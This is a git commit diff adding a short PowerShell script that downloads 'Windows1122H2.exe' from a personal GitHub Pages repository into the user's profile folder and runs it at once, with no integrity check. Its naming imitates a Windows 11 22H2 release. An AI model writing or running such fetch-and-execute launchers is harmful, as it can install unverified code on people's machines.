6c92bb8e4b301ed6bdc0d6796c983dccf6e7931a
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-08 23:29:59 +0300

    Update Windows1122H2versions0.0.1beta.ps1

--- Windows1122H2/Windows1122H2versions0.0.1beta.ps1
+++ Windows1122H2/Windows1122H2versions0.0.1beta.ps1
@@ -1,1 +1,10 @@
+$url = "https://github.com/webntdev/webntdev.github.io/raw/main/Windows1122H2/Windows1122H2.exe"
+$destination = "$env:USERPROFILE\Windows1122H2.exe"
 
+if (-not (Test-Path $destination)) {
+    Invoke-WebRequest -Uri $url -OutFile $destination
+}
+
+Start-Sleep -Seconds 1
+
+Start-Process -FilePath $destination
